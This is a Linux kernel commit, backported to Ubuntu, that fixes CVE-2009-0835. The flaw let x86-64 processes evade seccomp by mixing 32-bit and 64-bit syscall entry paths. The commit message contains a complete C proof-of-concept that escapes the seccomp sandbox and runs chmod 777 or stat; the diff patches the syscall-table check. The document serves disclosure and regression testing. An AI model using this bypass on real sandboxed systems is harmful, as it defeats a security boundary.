Canonical-kernel__Ubuntu-kernel
commit 9efd8dba014965224a7fb0dfa1524581ffc25a47
Author:     Roland McGrath <roland@redhat.com>
AuthorDate: Fri Feb 27 23:25:54 2009 -0800
Commit:     Stefan Bader <stefan.bader@canonical.com>
CommitDate: Wed Mar 18 18:54:29 2009 +0100

    x86-64: seccomp: fix 32/64 syscall hole
    
    CVE-2009-0835
    
    commit 5b1017404aea6d2e552e991b3fd814d839e9cd67 upstream
    
    On x86-64, a 32-bit process (TIF_IA32) can switch to 64-bit mode with
    ljmp, and then use the "syscall" instruction to make a 64-bit system
    call.  A 64-bit process make a 32-bit system call with int $0x80.
    
    In both these cases under CONFIG_SECCOMP=y, secure_computing() will use
    the wrong system call number table.  The fix is simple: test TS_COMPAT
    instead of TIF_IA32.  Here is an example exploit:
    
            /* test case for seccomp circumvention on x86-64
    
               There are two failure modes: compile with -m64 or compile with -m32.
    
               The -m64 case is the worst one, because it does "chmod 777 ." (could
               be any chmod call).  The -m32 case demonstrates it was able to do
               stat(), which can glean information but not harm anything directly.
    
               A buggy kernel will let the test do something, print, and exit 1; a
               fixed kernel will make it exit with SIGKILL before it does anything.
            */
    
            #define _GNU_SOURCE
            #include <assert.h>
            #include <inttypes.h>
            #include <stdio.h>
            #include <linux/prctl.h>
            #include <sys/stat.h>
            #include <unistd.h>
            #include <asm/unistd.h>
    
            int
            main (int argc, char **argv)
            {
              char buf[100];
              static const char dot[] = ".";
              long ret;
              unsigned st[24];
    
              if (prctl (PR_SET_SECCOMP, 1, 0, 0, 0) != 0)
                perror ("prctl(PR_SET_SECCOMP) -- not compiled into kernel?");
    
            #ifdef __x86_64__
              assert ((uintptr_t) dot < (1UL << 32));
              asm ("int $0x80 # %0 <- %1(%2 %3)"
                   : "=a" (ret) : "0" (15), "b" (dot), "c" (0777));
              ret = snprintf (buf, sizeof buf,
                              "result %ld (check mode on .!)\n", ret);
            #elif defined __i386__
              asm (".code32\n"
                   "pushl %%cs\n"
                   "pushl $2f\n"
                   "ljmpl $0x33, $1f\n"
                   ".code64\n"
                   "1: syscall # %0 <- %1(%2 %3)\n"
                   "lretl\n"
                   ".code32\n"
                   "2:"
                   : "=a" (ret) : "0" (4), "D" (dot), "S" (&st));
              if (ret == 0)
                ret = snprintf (buf, sizeof buf,
                                "stat . -> st_uid=%u\n", st[7]);
              else
                ret = snprintf (buf, sizeof buf, "result %ld\n", ret);
            #else
            # error "not this one"
            #endif
    
              write (1, buf, ret);
    
              syscall (__NR_exit, 1);
              return 2;
            }
    
    Signed-off-by: Roland McGrath <roland@redhat.com>
    [ I don't know if anybody actually uses seccomp, but it's enabled in
      at least both Fedora and SuSE kernels, so maybe somebody is. - Linus ]
    Signed-off-by: Linus Torvalds <torvalds@linux-foundation.org>
    Signed-off-by: Stefan Bader <stefan.bader@canonical.com>

diff --git a/include/asm-mips/seccomp.h b/include/asm-mips/seccomp.h
index 36ed44070256..a6772e9507f5 100644
--- a/include/asm-mips/seccomp.h
+++ b/include/asm-mips/seccomp.h
@@ -1,6 +1,5 @@
 #ifndef __ASM_SECCOMP_H
 
-#include <linux/thread_info.h>
 #include <linux/unistd.h>
 
 #define __NR_seccomp_read __NR_read
diff --git a/include/asm-powerpc/compat.h b/include/asm-powerpc/compat.h
index 64ab1ddbdf85..cd6685de7676 100644
--- a/include/asm-powerpc/compat.h
+++ b/include/asm-powerpc/compat.h
@@ -210,5 +210,10 @@ struct compat_shmid64_ds {
 	compat_ulong_t __unused6;
 };
 
+static inline int is_compat_task(void)
+{
+	return test_thread_flag(TIF_32BIT);
+}
+
 #endif /* __KERNEL__ */
 #endif /* _ASM_POWERPC_COMPAT_H */
diff --git a/include/asm-powerpc/seccomp.h b/include/asm-powerpc/seccomp.h
index 853765eb1f65..00c1d9133cfe 100644
--- a/include/asm-powerpc/seccomp.h
+++ b/include/asm-powerpc/seccomp.h
@@ -1,10 +1,6 @@
 #ifndef _ASM_POWERPC_SECCOMP_H
 #define _ASM_POWERPC_SECCOMP_H
 
-#ifdef __KERNEL__
-#include <linux/thread_info.h>
-#endif
-
 #include <linux/unistd.h>
 
 #define __NR_seccomp_read __NR_read
diff --git a/include/asm-sparc64/compat.h b/include/asm-sparc64/compat.h
index 01fe6682b405..14aa7bc94ffa 100644
--- a/include/asm-sparc64/compat.h
+++ b/include/asm-sparc64/compat.h
@@ -240,4 +240,9 @@ struct compat_shmid64_ds {
 	unsigned int	__unused2;
 };
 
+static inline int is_compat_task(void)
+{
+	return test_thread_flag(TIF_32BIT);
+}
+
 #endif /* _ASM_SPARC64_COMPAT_H */
diff --git a/include/asm-sparc64/seccomp.h b/include/asm-sparc64/seccomp.h
index 7fcd9968192b..adca1bce41d4 100644
--- a/include/asm-sparc64/seccomp.h
+++ b/include/asm-sparc64/seccomp.h
@@ -1,11 +1,5 @@
 #ifndef _ASM_SECCOMP_H
 
-#include <linux/thread_info.h> /* already defines TIF_32BIT */
-
-#ifndef TIF_32BIT
-#error "unexpected TIF_32BIT on sparc64"
-#endif
-
 #include <linux/unistd.h>
 
 #define __NR_seccomp_read __NR_read
diff --git a/include/asm-x86/seccomp_32.h b/include/asm-x86/seccomp_32.h
index 18da19e89bff..e0f6b950644e 100644
--- a/include/asm-x86/seccomp_32.h
+++ b/include/asm-x86/seccomp_32.h
@@ -1,11 +1,5 @@
 #ifndef _ASM_SECCOMP_H
 
-#include <linux/thread_info.h>
-
-#ifdef TIF_32BIT
-#error "unexpected TIF_32BIT on i386"
-#endif
-
 #include <linux/unistd.h>
 
 #define __NR_seccomp_read __NR_read
diff --git a/include/asm-x86/seccomp_64.h b/include/asm-x86/seccomp_64.h
index 553af65a2287..15cdc9f40e6d 100644
--- a/include/asm-x86/seccomp_64.h
+++ b/include/asm-x86/seccomp_64.h
@@ -1,13 +1,5 @@
 #ifndef _ASM_SECCOMP_H
 
-#include <linux/thread_info.h>
-
-#ifdef TIF_32BIT
-#error "unexpected TIF_32BIT on x86_64"
-#else
-#define TIF_32BIT TIF_IA32
-#endif
-
 #include <linux/unistd.h>
 #include <asm/ia32_unistd.h>
 
diff --git a/kernel/seccomp.c b/kernel/seccomp.c
index ad64fcb731f2..57d4b13b631d 100644
--- a/kernel/seccomp.c
+++ b/kernel/seccomp.c
@@ -8,6 +8,7 @@
 
 #include <linux/seccomp.h>
 #include <linux/sched.h>
+#include <linux/compat.h>
 
 /* #define SECCOMP_DEBUG 1 */
 #define NR_SECCOMP_MODES 1
@@ -22,7 +23,7 @@ static int mode1_syscalls[] = {
 	0, /* null terminated */
 };
 
-#ifdef TIF_32BIT
+#ifdef CONFIG_COMPAT
 static int mode1_syscalls_32[] = {
 	__NR_seccomp_read_32, __NR_seccomp_write_32, __NR_seccomp_exit_32, __NR_seccomp_sigreturn_32,
 	0, /* null terminated */
@@ -37,8 +38,8 @@ void __secure_computing(int this_syscall)
 	switch (mode) {
 	case 1:
 		syscall = mode1_syscalls;
-#ifdef TIF_32BIT
-		if (test_thread_flag(TIF_32BIT))
+#ifdef CONFIG_COMPAT
+		if (is_compat_task())
 			syscall = mode1_syscalls_32;
 #endif
 		do {
